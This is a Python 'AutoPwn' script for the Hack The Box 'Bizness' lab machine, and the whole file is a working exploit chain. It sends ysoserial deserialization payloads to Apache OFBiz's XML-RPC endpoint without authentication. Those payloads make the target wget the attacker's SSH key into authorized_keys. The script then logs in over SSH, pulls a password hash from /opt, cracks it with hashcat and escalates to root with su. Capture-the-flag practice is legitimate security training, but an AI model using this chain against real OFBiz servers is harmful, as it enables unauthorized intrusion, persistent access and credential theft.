import requests
from colorama import Fore, Style
import argparse
import logging
import os
import re
import subprocess
from time import sleep
import base64
import urllib3
import paramiko
from urllib.parse import urlparse
import base64
from Crypto.PublicKey import RSA



def key_gen(name="id"):
    key = RSA.generate(2048)
    priv_file = f"./{name}_rsa"
    pub_file = f"./{name}_rsa.pub"
    with open(priv_file, 'wb') as content_file:
        os.chmod(priv_file, 0o0600)
        content_file.write(key.exportKey('PEM') + b'\n')
    pubkey = key.publickey()
    with open(pub_file, 'wb') as content_file:
        pubkeyContents = pubkey.exportKey('OpenSSH') + b'\n'
        content_file.write(pubkeyContents)
        return pubkeyContents

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("Invalid URL schema. Use 'http://' or 'https://'.")

def get_encoded_payload(cmd):
    if not os.path.isfile("ysoserial-all.jar"):
        logging.error(f"{Fore.RED}[-] ysoserial-all.jar not found. Exiting.{Style.RESET_ALL}")
        exit(1)
    sleep(1)
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)
        encoded_output = base64.b64encode(result.stdout).decode().replace("\n", "")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[-] LOG: An error occurred during payload generation: {e}{Style.RESET_ALL}")
    return encoded_output

def send_post_request(url, encoded_output):
    try:
        target_url = f"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        headers = {
            "Content-Type": "application/xml",
        }
        xml_data = f"""<?xml version="1.0"?>
            <methodCall>
              <methodName>Methodname</methodName>
              <params>
                <param>
                  <value>
                    <struct>
                      <member>
                        <name>test</name>
                        <value>
                          <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{encoded_output}</serializable>
                        </value>
                      </member>
                    </struct>
                  </value>
                </param>
              </params>
            </methodCall>
        """
        response = requests.post(target_url, headers=headers, data=xml_data, verify=False) 
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] LOG: ERROR: {e}{Style.RESET_ALL}")

def userExploit():
    file_contents = key_gen()
    parser = argparse.ArgumentParser(description="AutoPwn Script for Bizness HTB machine")
    parser.add_argument("url", help="TARGET URL")
    parser.add_argument("LHOST", help="Local listening address")
    args = parser.parse_args()
    url = args.url.rstrip('/')
    validate_url(args.url)
    print(f"{Fore.MAGENTA}[+] Starting listening server...{Style.RESET_ALL}")
    sleep(1)
    print(f"{Fore.MAGENTA}[+] Generating payload...{Style.RESET_ALL}")
    sleep(1)
    print(f"{Fore.MAGENTA}[+] Payload generated successfully.{Style.RESET_ALL}")
    command0 = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 'mkdir /home/ofbiz/.ssh/'"
    command1 = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 'wget http://{args.LHOST}:8000/id_rsa.pub -O /home/ofbiz/.ssh/authorized_keys'"
    command2 = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 'chmod 600 /home/ofbiz/.ssh/authorized_keys'"
    start_HTTP_server()
    encoded_output = get_encoded_payload(command0)
    print(f"{Fore.MAGENTA}[+] Sending malicious serialized payload #1...{Style.RESET_ALL}")
    send_post_request(url, encoded_output)
    encoded_output = get_encoded_payload(command1)
    print(f"{Fore.MAGENTA}[+] Sending malicious serialized payload #2...{Style.RESET_ALL}")
    send_post_request(url, encoded_output)
    encoded_output = get_encoded_payload(command2)
    print(f"{Fore.MAGENTA}[+] Sending malicious serialized payload #3...{Style.RESET_ALL}")
    send_post_request(url, encoded_output)
    os.system("kill -9 $(lsof -t -i:8000)")
    return(args.url)


def start_HTTP_server():
    subprocess.Popen(["python", "-m", "http.server", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    
def establish_ssh_connection(hostname, username, private_key_path):
    ssh = paramiko.SSHClient()
    private_key = paramiko.RSAKey(filename=private_key_path)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, username=username, pkey=private_key)
        print(f"{Fore.YELLOW}[+] SSH connection established.{Style.RESET_ALL}")
        return ssh
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to establish SSH connection: {str(e)}{Style.RESET_ALL}")
        return None

def execute_ssh_command(ssh, command):
    if ssh is not None:
        try:
            stdin, stdout, stderr = ssh.exec_command(command)
            print(f"{Fore.YELLOW}[+] Command executed successfully:{Style.RESET_ALL}")
            sleep(1)

            return stdout.read().decode()
        except Exception as e:
            print(f"{Fore.RED}Failed to execute command: {str(e)}{Style.RESET_ALL}")
            sleep(1)
    return False

def close_ssh_connection(ssh):
    if ssh is not None:
        ssh.close()
        print(f"{Fore.YELLOW}[*] SSH connection closed.{Style.RESET_ALL}")
        sleep(1)

def hashDec(input_string):

    match = re.search(r'\$.*\$(.*?)\$', input_string)
    salt = match.group(1)
    match = re.search(r'\$d\$(.*)$', input_string)
    encrypted_value = match.group(1)
    # Replace "_" with "/"
    replaced_slash = encrypted_value.replace("_", "/")
    # Replace "-" with "+"
    replaced_plus = replaced_slash.replace("-", "+")
    # Add padding if needed
    while len(replaced_plus) % 4 != 0:
        replaced_plus += '='
    # Base64 decode
    try:
        base64_decoded = base64.b64decode(replaced_plus)
    except base64.binascii.Error as e:
        print(f"Error decoding Base64: {e}")
        return None
    # Convert the decoded bytes to hexadecimal
    restored = base64_decoded.hex() + ":" + salt 
    return restored

if __name__ == '__main__':
    url = userExploit()
    urlParsed = urlparse(url)
    hostname = urlParsed.hostname
    username = "ofbiz"
    private_key_path = "./id_rsa"
    ssh_connection = establish_ssh_connection(hostname, username, private_key_path)
    if ssh_connection:
        try:
            capturedString =execute_ssh_command(ssh_connection, 'grep -rlnw /opt/ -e "\$SHA\$d\$.*" | head -n 1 | xargs strings | grep "SHA"')
            pattern = r'currentPassword="([^"]+)"'
            match = re.search(pattern,capturedString)
            if match:
                hash = match.group(1)
                print(f"{Fore.MAGENTA}[+] Hashcrypt hash pulled: {Style.RESET_ALL}" +hash)
                sleep(2)
                print(f"{Fore.YELLOW}[+] Initializing decryption process{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Restored Hash {Style.RESET_ALL}" + str(hashDec(hash)))
                with open('hash.txt', 'w') as file:
                    file.write(str(hashDec(hash)))
                print(f"{Fore.MAGENTA}Initializing hashcat to crack hash{Style.RESET_ALL}")
                os.system('hashcat hash.txt rockyou.txt -m 120 --potfile-path successful_passwords.pot > /dev/null 2>&1')
                sleep(3)
                with open('successful_passwords.pot', 'r') as file:
                    file_contents = file.read()
                    file_contents = file_contents.strip().split(":")[-1]
                    print(f"{Fore.GREEN}[+] Cracked password is: {Style.RESET_ALL} " + file_contents)
                    password = file_contents
                    userFlag = execute_ssh_command(ssh_connection, 'cat /home/ofbiz/user.txt')
                    rootFlag = execute_ssh_command(ssh_connection, f'echo {password} | su -c "cat /root/root.txt" root')
                    print("################################")
                    print(f"{Fore.GREEN}USER FLAG: {Style.RESET_ALL}" + userFlag)
                    print(f"{Fore.GREEN}ROOT FLAG: {Style.RESET_ALL}" + rootFlag)
                    print("################################")
            else:
                print("[-] Exploit failed...")
        finally:
            close_ssh_connection(ssh_connection)